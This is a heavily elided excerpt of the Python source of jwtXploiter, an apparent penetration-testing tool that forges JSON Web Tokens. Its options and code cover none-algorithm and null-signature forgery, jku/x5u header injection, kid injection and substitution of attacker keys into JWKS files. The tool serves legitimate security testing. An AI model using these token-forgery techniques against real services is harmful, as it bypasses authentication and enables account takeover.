# Extracted from: C:\DEV\PyAgent\.external\0xSojalSec-jwtXploiter\jwt-crack.py
#!/usr/bin/python3
...
{Bcolors.HEADER}Command:{Bcolors.ENDC} {Bcolors.OKCYAN}{" ".join(command)}{Bcolors.ENDC}
    ...
    def __init__(
        ...
        self.no_key_validation_args = [
            self.verify_token_with,
            self.find_key_from_jwks,
            self.decode,
            self.null_signature,
        ]
        self.jwks_args = [
            self.jku_basic,
            self.jku_redirect,
            self.jku_header_injection,
            self.x5u_basic,
            self.x5u_header_injection,
            self.generate_jwk,
        ]
        self.cant_asymmetric_args = [
            self.auto_try,
            self.kid,
            self.exec_via_kid,
            self.specified_key,
        ...
        self.require_alg_args = (
            [self.path_to_key] + self.cant_asymmetric_args + self.jwks_args
        )
        self.keep_alg_args = [
            self.decode,
            self.verify_token_with,
        ...
        self.original_token_header, self.original_token_payload = (
            Cracker.decode_encoded_token(self.token_dict, quiet=self.quiet)
        )
    ...
    def validation(self):
        ...
        try:
            if self.add_time:
                ...
                if not 0 < self.add_time < 25:
                    print(
                        f"{Bcolors.FAIL}jwtxpl: error: accepted time values are from 1 to 24{Bcolors.ENDC}"
                    )
                    sys.exit(6)
            if self.sub_time:
            ...
            print(
                f"{Bcolors.FAIL}jwtxpl: error: time values must be numeric{Bcolors.ENDC}"
            )
            sys.exit(6)
        """Validate alg"""
        if not any(self.keep_alg_args):
            if not self.alg:
                print(
                    f"{Bcolors.FAIL}jwtxpl: error: missing --alg. Only verifying and decoding operations can mess it up{Bcolors.ENDC}"
                )
                sys.exit(4)
        if self.alg is not None:
            ...
            if self.alg == "None" or self.alg == "none":
                if any(self.require_alg_args):
                    print(
                        f"{Bcolors.FAIL}jwtxpl: error: you don't need a key with None/none algorithm{Bcolors.ENDC}"
                    )
                    sys.exit(2)
                ifprint(
                    not self.quiet,
                    f"{Bcolors.OKBLUE}INFO: some JWT libraries use 'none' instead of 'None', make sure to try both.{Bcolors.ENDC}",
                )
            elif self.alg.lower()[:2] in ["rs", "ps", "ec"]:
                if not any(
                    arg
                    for arg in self.jwks_args
                    + [
                        self.path_to_key,
                        self.verify_token_with,
                        self.find_key_from_jwks,
                    ...
                    print(
                        f"{Bcolors.FAIL}jwtxpl: error: missing a valid key argument for EC/RSA{Bcolors.ENDC}"
                    )
                    sys.exit(4)
        ...
        if not any(self.no_key_validation_args):
            ...
            if self.manual:
                if not self.jku_basic and not self.x5u_basic:
                    print(
                        f"{Bcolors.FAIL}jwtxpl: error: you can use --manual only with jku/x5u basic{Bcolors.ENDC}"
                    )
                    sys.exit(4)
            if self.path_to_key:
                if not os.path.exists(self.path_to_key):
                    print(
                        f"{Bcolors.FAIL}jwtxpl: error: no such file {self.path_to_key}{Bcolors.ENDC}"
                    )
                    sys.exit(7)
            if self.alg[:2] == "RS" or self.alg[:2] == "PS":
                ...
                if any(self.cant_asymmetric_args):
                    print(
                        f"{Bcolors.FAIL}jwtxpl: error: you passed some arg not compatible with RS* alg{Bcolors.ENDC}"
                    )
                    sys.exit(2)
                elif not any(self.jwks_args + [self.path_to_key, self.unverified]):
                    print(
                        f"{Bcolors.FAIL}jwtxpl: error: missing an arg for the key{Bcolors.ENDC}"
                    )
                    sys.exit(4)
                elif (
                    len(list(filter(lambda x: x, self.jwks_args + [self.unverified])))
                    > 1
                ):
                    print(
                        f"{Bcolors.FAIL}jwtxpl: error: too many key related arg {Bcolors.ENDC}"
                    )
                    sys.exit(2)
                ...
                if not self.path_to_key:
                    ...
                    if self.dump_key:
                        ...
                        ifprint(
                            not self.quiet,
                            f"{Bcolors.WARNING}jwtxpl: warn: you should use -D in order to dump the generated key into a file, so you can reuse it{Bcolors.ENDC}",
                        )
                else:
                    ...
                    if not isinstance(self.key, _RSAPrivateKey):
                        print(
                            f"{Bcolors.FAIL}jwtxpl: error: alg/key mismatch. Key is not a private key or it's not RSA{Bcolors.ENDC}"
                        )
                        sys.exit(2)
                """Extract public key"""
                ...
                if any([self.x5u_basic, self.x5u_header_injection]):
                    ...
                    certificate_object = Cracker.gen_self_signed_certificate(
                        self.key, self.key.pub, 30, sign_hash
                    )
                    certificate_object_content = certificate_object.public_bytes(
                        Encoding.PEM
                    ).decode()
                    self.x5c = "".join(
                        [
                            line.strip()
                            for line in certificate_object_content.split("\n")
                ...
                if any(self.cant_asymmetric_args):
                    print(
                        f"{Bcolors.FAIL}jwtxpl: error: you passed some arg not compatible with ES*{Bcolors.ENDC}"
                    )
                    sys.exit(2)
                elif not any(self.jwks_args + [self.path_to_key, self.unverified]):
                    print(
                    ...
                    print(
                        f"{Bcolors.FAIL}jwtxpl: error: too many key related argument{Bcolors.ENDC}"
                    )
                    sys.exit(2)
                """No argument conflict"""
                if not self.path_to_key:
                    ...
                    if self.dump_key:
                        ...
                        ifprint(
                            not self.quiet,
                            f"{Bcolors.WARNING}jwtxpl: warn: ou should use -D in order to dump the generated key into a file, so you can reuse it{Bcolors.ENDC}",
                        )
                else:
                    """We have a key file to read from"""
                    self.key = Cracker.read_pem_private_key(self.path_to_key)
                    if not isinstance(self.key, _EllipticCurvePrivateKey):
                        print(
                            f"{Bcolors.FAIL}jwtxpl: error: alg/key mismatch. Key is not a private key or it's not EC{Bcolors.FAIL}"
                        )
                        sys.exit(2)
                ...
                if any(self.jwks_args):
                    print(
                        f"{Bcolors.FAIL}jwtxpl: error: you passed some arg not compatible with HS*{Bcolors.ENDC}"
                    )
                    sys.exit(2)
                elif not any(
                    self.cant_asymmetric_args + [self.path_to_key, self.unverified]
                ):
                    print(
                        f"{Bcolors.FAIL}jwtxpl: error: missing an arg for the key{Bcolors.ENDC}"
                    )
                    ...
                    len(
                        list(
                            filter(
                                lambda x: x,
                                self.cant_asymmetric_args
                                + [self.path_to_key, self.unverified],
                            )
                        )
                    )
                    > 1
                    ...
                    print(
                        f"{Bcolors.FAIL}jwtxpl: error: too many key related args{Bcolors.ENDC}"
                    )
                    sys.exit(2)
                """No argument conflict"""
                if self.dump_key:
                    ifprint(
                        not self.quiet,
                        f"{Bcolors.WARNING}jwtxpl: warn: no keys generated with HS*, dumping ignored{Bcolors.ENDC}",
                    )
                if self.auto_try is not None:
                    ...
                    if self.kid.lower() == "dirtrv":
                        ...
                        print(
                            f"{Bcolors.FAIL}jwtxpl: error: invalid --inject-kid{Bcolors.ENDC}"
                        )
                        sys.exit(6)
    ...
    def decode_and_quit(self):
        ...
        if any(arg for arg in other_args):
            print(
                f"{Bcolors.WARNING}jwtxpl: warn: you have not to specify any other argument if you want to decode the token{Bcolors.ENDC}"
            )
        print(
            f"{Bcolors.HEADER}Header:{Bcolors.ENDC} {Bcolors.OKCYAN}{self.original_token_header}{Bcolors.ENDC}"
            + "\n"
    ...
    def verify_and_quit(self):
        ...
        if not os.path.exists(self.verify_token_with):
            print(
                f"{Bcolors.FAIL}jwtxpl: error: no such file: {self.verify_token_with}{Bcolors.ENDC}"
            )
            sys.exit(7)
        other_args = [
            self.alg,
        ...
        if any(arg for arg in other_args):
            print(
                f"{Bcolors.WARNING}jwtxpl: warn: only the alg is required with verification{Bcolors.ENDC}"
            )
        ...
        try:
            if algorithm[:2] == "RS":
                ...
                if key is None:
                    ...
                    if cert is None:
                        print(
                            f"{Bcolors.FAIL}jwtxpl: error: key/cert file is not PEM format or is a private key{Bcolors.ENDC}"
                        )
                        sys.exit(6)
                    key = cert.public_key()
                verified = Cracker.verify_token_with_rsa_pkcs1(
                    key, self.token, sign_hash
                )
            elif algorithm[:2] == "PS":
                key = Cracker.read_pem_public_key(self.verify_token_with)
                if key is None:
            ...
            print(
                f"{Bcolors.FAIL}jwtxpl: error: key mismatch. the key you passed is not compatible with {self.alg}{Bcolors.ENDC}"
            )
            sys.exit(2)
        result = (
            f"Verified with {self.verify_token_with}"
            if verified
            else f"Unverified with {self.verify_token_with}"
        )
        print(
            f"{Bcolors.HEADER}Token:{Bcolors.ENDC} {Bcolors.OKCYAN}{result}{Bcolors.ENDC}"
        )
        sys.exit(0)
    ...
    def find_verifier_key_from_jwks_and_quit(self):
        ...
        if not os.path.exists(self.find_key_from_jwks):
            print(
                f"{Bcolors.FAIL}jwtxpl: error: no such file {self.find_key_from_jwks}{Bcolors.ENDC}"
            )
            sys.exit(7)
        try:
        ...
        index = Cracker.find_verifier_key_from_jwks(
            self.token, jwks_dict, sign_hash, jwa=jwa
        )
        if index is None:
            print(
                f"{Bcolors.OKBLUE}No keys from {self.find_key_from_jwks} can verify token signature{Bcolors.ENDC}"
            )
            sys.exit(0)
        try:
    ...
    def modify_header_and_payload(self):
        ...
        if self.add_into:
            for item in self.add_into:
                try:
                    ...
                    print(
                        f"{Bcolors.FAIL}jwtxpl: error: --add-into must have key:value syntax, where key is header or payload{Bcolors.ENDC}"
                    )
                    sys.exit(5)
                if to_dict != "header" and to_dict != "payload":
                    print(
                        f"{Bcolors.FAIL}jwtxpl: error: you can insert keys only into header and payload{Bcolors.ENDC}"
                    )
                    sys.exit(6)
                if to_dict == "header":
                    ...
                    ifprint(
                        not self.quiet,
                        f"{Bcolors.WARNING}jwtxpl: warn: adding key to payload is useless since you can do it directly via --payload{Bcolors.ENDC}",
                    )
                    payload_dict = Cracker.add_key(payload_dict, to_add)
        if self.add_time:
            payload_dict = Cracker.modify_time_claims(
                self.add_time, payload_dict, instruction="add"
            )
        if self.sub_time:
            payload_dict = Cracker.modify_time_claims(
                self.sub_time, payload_dict, instruction="del"
            )
        if self.kid:
            if "kid" not in header_dict.keys():
                print(
                    f"{Bcolors.FAIL}jwtxpl: error: JWT header has no kid{Bcolors.ENDC}"
                )
                sys.exit(1)
            if self.kid != "DirTrv":
            ...
            if "jku" not in header_dict.keys():
                print(
                    f"{Bcolors.FAIL}jwtxpl: error: JWT header has no jku{Bcolors.ENDC}"
                )
                sys.exit(1)
            if self.manual:
                url = self.jku_basic
                ...
                if any(self.jku_basic.endswith(end) for end in commons_jwks_url_ends):
                    print(
                        f"{Bcolors.FAIL}jwtxpl: error: '/.well-known/jwks.json' will automatically be appended to you url. If you need to specify the complete url use --manual{Bcolors.ENDC}"
                    )
                    sys.exit(5)
            ...
            if "HERE" not in self.jku_redirect:
                print(
                    f"{Bcolors.FAIL}jwtxpl: error: you have to specify HERE keyword in the place you want to inject{Bcolors.ENDC}"
                )
                sys.exit(5)
            if "," not in self.jku_redirect:
                print(
                    f"{Bcolors.FAIL}jwtxpl: error: missing url. Please pass the vulnerable url and your one as comma separated values{Bcolors.ENDC}"
                )
                sys.exit(5)
            if any(self.jku_redirect.endswith(end) for end in commons_jwks_url_ends):
                print(
                    f"{Bcolors.FAIL}jwtxpl: error: '/.well-known/jwks.json' will automatically be appended to your url. To craft an url by yourself, use --jku-basic with the --manual option{Bcolors.ENDC}"
                )
                sys.exit(5)
            main_url = self.jku_redirect.split(",")[0]
            your_url = (
                self.jku_redirect.split(",")[1].rstrip("/") + "/.well-known/jwks.json"
            )
            self.jku_basic_attack(header_dict)
            ...
            if "x5u" not in header_dict.keys():
                print(
                    f"{Bcolors.FAIL}jwtxpl: error: JWT header has no x5u{Bcolors.ENDC}"
                )
                sys.exit(1)
            if self.manual:
                url = self.x5u_basic
                ...
                if any(self.x5u_basic.endswith(end) for end in commons_jwks_url_ends):
                    print(
                        f"{Bcolors.FAIL}jwtxpl: error: '/.well-known/jwks.json' will automatically be appended to your url. If you need to specify the complete url please use --manual{Bcolors.ENDC}"
                    )
                    sys.exit(5)
            ...
            if "x5u" not in header_dict.keys():
                print(
                    f"{Bcolors.FAIL}jwtxpl: error: JWT has no x5u header{Bcolors.ENDC}"
                )
                sys.exit(1)
        ...
        if self.user_payload:
            for item in self.user_payload:
                payload_dict = Cracker.change_payload(
                    item[0], payload_dict, quiet=self.quiet
                )
        if self.complex_payload:
            ifprint(
                not self.quiet,
                f"{Bcolors.WARNING}jwtxpl: warn: deprecation warning! --complex-payload has been merged in --payload. You should move towards it. --complex-payload will be removed in future releases{Bcolors.ENDC}",
            )
        ...
        if self.remove_from:
            for item in self.remove_from:
                try:
                    ...
                    print(
                        f"{Bcolors.FAIL}jwtxpl: error: --remove-from must have key:value syntax, where key is header or payload{Bcolors.ENDC}"
                    )
                    sys.exit(5)
                if from_dict != "header" and from_dict != "payload":
                    print(
                        f"{Bcolors.FAIL}jwtxpl: error: you can delete keys only from header or payload{Bcolors.ENDC}"
                    )
                    sys.exit(6)
                if (
                    from_dict == "header"
                    ...
                    print(
                        f"{Bcolors.FAIL}jwtxpl: error: deleting key {to_del} will invalidate the token{Bcolors.ENDC}"
                    )
                    sys.exit(1)
                if from_dict == "header":
    ...
    def jku_basic_attack(self, header):
        ...
        if filename is None:
            print(
                f"{Bcolors.FAIL}jwtxpl: error: can't download jwks file from url specified in x5u header{Bcolors.ENDC}"
            )
            sys.exit(1)
        ...
        if len(jwks_dict["keys"]) == 1:
            ...
            sign_hash = Cracker.get_sign_hash(self.alg)
            index = Cracker.find_verifier_key_from_jwks(
                self.token, jwks_dict, sign_hash, jwa=self.alg
            )
        try:
            if self.alg[:2] in ["RS", "PS"]:
                jwks_dict["keys"][index]["e"] = (
                    base64.urlsafe_b64encode(
                        self.key.pub.e.to_bytes(
                            self.key.pub.e.bit_length() // 8 + 1, byteorder="big"
                        )
                    )
                    .decode("utf-8")
                    .rstrip("=")
                )
                jwks_dict["keys"][index]["n"] = (
                    base64.urlsafe_b64encode(
                        self.key.pub.n.to_bytes(
                            self.key.pub.n.bit_length() // 8 + 1, byteorder="big"
                        )
                    )
                    .decode("utf-8")
                    .rstrip("=")
                ...
                jwks_dict["keys"][index]["x"] = (
                    base64.urlsafe_b64encode(
                        self.key.pub.x.to_bytes(
                            self.key.pub.x.bit_length() // 8 + 1, byteorder="big"
                        )
                    )
                    .decode("utf-8")
                    .rstrip("=")
                )
                jwks_dict["keys"][index]["y"] = (
                    base64.urlsafe_b64encode(
                        self.key.pub.y.to_bytes(
                            self.key.pub.y.bit_length() // 8 + 1, byteorder="big"
                        )
                    )
                    .decode("utf-8")
                    .rstrip("=")
        ...
        if self.null_signature:
            ...
            try:
                if self.alg == "None" or self.alg == "none":
                    ...
                    if self.key is None:
                        print(
                            f"{Bcolors.FAIL}jwtxpl: error: key is needed with HS*{Bcolors.ENDC}"
                        )
                        sys.exit(4)
                    signature = Cracker.sign_token_with_hmac(
                        self.key, partial_token, sign_hash
                    )
                elif self.alg[:2] == "RS":
                    if self.key is None:
                        print(
                            f"{Bcolors.FAIL}jwtxpl: error: key is needed with RS*{Bcolors.ENDC}"
                        )
                        sys.exit(4)
                    signature = Cracker.sign_token_with_rsa_pkcs1(
                        self.key, partial_token, sign_hash
                    )
                elif self.alg[:2] == "PS":
                    if self.key is None:
                        print(
                            f"{Bcolors.FAIL}jwtxpl: error: key is needed with PS*{Bcolors.ENDC}"
                        )
                        sys.exit(4)
                    signature = Cracker.sign_token_with_rsa_pss(
                        self.key, partial_token, sign_hash
                    )
                elif self.alg[:2] == "ES":
                    if self.key is None:
                        print(
                            f"{Bcolors.FAIL}jwtxpl: error: key is needed with ES*{Bcolors.ENDC}"
                        )
                        sys.exit(4)
                    signature = Cracker.sign_token_with_ec(
                        self.key, partial_token, sign_hash
                    )
            except (TypeError, AttributeError):
                print(
    ...
    def dictionarize_token(token):
        ...
        if len(token_list) < 3:
            token_list.append("")
        token_dict = dict(
            header=token_list[0], payload=token_list[1], signature=token_list[2]
        )
        return token_dict
    ...
    def append_equals_if_needed(string):
        ...
        while not final_text:
            try:
                ...
                if i == 2:
                    print(
                        f"{Bcolors.FAIL}jwtxpl: error: error during token or jwks base64 decoding.{Bcolors.ENDC}"
                    )
                    sys.exit(1)
                encoded += b"="
                i += 1
    ...
    def decode_encoded_token(iterable, quiet=False):
        ...
        if iterable["header"] is None or iterable["payload"] is None:
            ifprint(
                not quiet,
                f"{Bcolors.OKBLUE}Please pass the token dict as parameter{Bcolors.ENDC}",
            )
        ...
        try:
            ...
            print(
                f"{Bcolors.FAIL}jwtxpl: error: decoding error. Please be sure to pass a valid jwt{Bcolors.ENDC}"
            )
            sys.exit(3)
    ...
    def _change_payload(user_input, iterable):
        ...
        try:
            ...
            print(
                f"{Bcolors.FAIL}jwtxpl: error: payload changes must have this syntax: name:value. You have written '{user_input}'{Bcolors.ENDC}"
            )
            sys.exit(5)
        if new_payload_key not in iterable.keys():
            print(
                f"{Bcolors.WARNING}jwtxpl: warn: can't find {new_payload_key} in the token payload. It will be added{Bcolors.ENDC}"
            )
    ...
    def delete_key(iterable, key):
        ...
        if key not in iterable.keys():
            print(
                f"{Bcolors.FAIL}jwtxpl: error: the key {key} does not exists in the specified section{Bcolors.ENDC}"
            )
            sys.exit(6)
        del iterable[key]
        return iterable
    ...
    def add_key(iterable, key):
        ...
        if key in iterable.keys():
            print(
                f"{Bcolors.FAIL}jwtxpl: error: you are trying to add a key that already exists{Bcolors.ENDC}"
            )
            sys.exit(6)
    ...
    def encode_token_segment(json_string):
        ...
        """
        encoded_new_segment_bytes = base64.urlsafe_b64encode(
    ...
    def get_original_alg(header):
        ...
        """
        return json.loads(
            base64.urlsafe_b64decode(Cracker.append_equals_if_needed(header))
        )["alg"]
    ...
    def modify_time_claims(qt, iterable, instruction="add"):
        ...
        if not any(claim in iterable.keys() for claim in time_claims):
            print(
                f"{Bcolors.FAIL}jwtxpl: error: Token payload has no time claim{Bcolors.ENDC}"
            )
            sys.exit(6)
    ...
    def sign_token_with_hmac(key, partial_token, sign_hash):
        ...
        signature = (
            base64.urlsafe_b64encode(
                hmac.new(key.encode(), partial_token.encode(), sign_hash).digest()
            )
            .decode()
            .rstrip("=")
        )
    ...
    def sign_token_with_ec(key, partial_token, sign_hash):
        ...
        signature = (
            base64.urlsafe_b64encode(
                key.sign(partial_token.encode(), ec.ECDSA(sign_hash))
            )
            .decode()
            .rstrip("=")
        )
    ...
    def verify_token_with_ec(key, token, sign_hash):
        ...
        try:
            is_valid_if_none = key.verify(
                untrusted_der_signature, partial_token.encode(), ec.ECDSA(sign_hash)
            )
        except InvalidSignature:
            return False
        if is_valid_if_none is None:
    ...
    def dump_pem_private_key(key, path):
        ...
        """
        key_bytes_data = key.private_bytes(
    ...
    def dump_pem_public_key(key, path):
        ...
        :return: path, if created, else None
        """
        key_bytes_data = key.public_bytes(
    ...
    def gen_self_signed_certificate(private_key, public_key, days, sign_hash):
        ...
        subject = issuer = x509.Name(
            [
                x509.NameAttribute(NameOID.ORGANIZATION_NAME, "Testing Inc"),
                x509.NameAttribute(NameOID.COMMON_NAME, "Testing"),
            ]
        )
        certificate = (
            ...
            .add_extension(
                x509.SubjectAlternativeName([x509.DNSName("test")]), critical=False
            )
    ...
    def find_verifier_key_from_jwks(token, jwks_dict, sign_hash, jwa="RS256"):
        ...
        for jwk in jwks_dict["keys"]:
            ...
            if public_key is None:
                return None
            if jwa[:2] == "RS":
                is_this_key = Cracker.verify_token_with_rsa_pkcs1(
                    public_key, token, sign_hash
                )
            elif jwa[:2] == "PS":
                is_this_key = Cracker.verify_token_with_rsa_pss(
                    public_key, token, sign_hash
                )
            elif jwa[:2] == "ES":
    ...
    def change_payload(string, iterable, quiet=False):
        ...
        try:
            ...
            print(
                f"{Bcolors.FAIL}jwtxpl: error: payload changes must have this syntax: name:value. You have written '{string}'{Bcolors.ENDC}"
            )
            sys.exit(5)
        if not isinstance(keys, list):
            if keys not in iterable.keys():
                ifprint(
                    not quiet,
                    f"{Bcolors.WARNING}jwtxpl: warn: can't find {keys} in the token payload. It will be added{Bcolors.ENDC}",
                )
            iterable[keys] = vals
        else:
            i = 0
            for key in keys:
                try:
                    ...
                    print(
                        f"{Bcolors.FAIL}jwtxpl: error: subclaim does not exists. You can change subclaims values or build new complex claims from scratch, but not convert data types{Bcolors.ENDC}"
                    )
                    sys.exit(6)
                finally:
                    i += 1
    ...
    def get_key_from_ssl_cert(domain, port=443):
        ...
        try:
            ...
            print(
                f"{Bcolors.FAIL}jwtxpl: error: host {domain} not known (check you connection){Bcolors.ENDC}"
            )
            sys.exit(21)
        except ConnectionRefusedError:
            print(
                f"{Bcolors.FAIL}jwtxpl: error: connection refused by {domain}{Bcolors.ENDC}"
            )
            sys.exit(1)
    ...
    def run(self):
        ...
        if self.alg is None:
            print(
                f"{Bcolors.FAIL}jwtxpl: error: missing --alg. Alg is required if you are not decoding(2){Bcolors.ENDC}"
            )
            sys.exit(4)
        ...
        ifprint(
            not self.quiet,
            f"{Bcolors.HEADER}Crafted header ={Bcolors.ENDC} {Bcolors.OKCYAN}{header}{Bcolors.ENDC}, {Bcolors.HEADER}Crafted payload ={Bcolors.ENDC} {Bcolors.OKCYAN}{payload}{Bcolors.ENDC}",
        )
        if not self.quiet:
            print(
                f"{Bcolors.BOLD}{Bcolors.HEADER}Final Token:{Bcolors.ENDC} {Bcolors.BOLD}{Bcolors.OKBLUE}{final_token}{Bcolors.ENDC}"
            )
        else:
            print(final_token)
...
if __name__ == "__main__":
    ...
    # Add the arguments
    parser.add_argument("token", help="Your JWT")
    parser.add_argument(
        "-a",
        "--alg",
    ...
    parser.add_argument(
        "--specify-key",
        help="A string to be used as password for sign the token",
        metavar="<key>",
        required=False,
    )
    parser.add_argument(
    ...
    cracker = Cracker(
        ...
        args.x5u_basic,
        args.x5u_inbody,
        args.verify_token_with,
        args.subtract_time,
        args.add_time,
        args.find_key_from_jwks,
        args.unverified,
        args.blank,
        args.decode,
        args.manual,
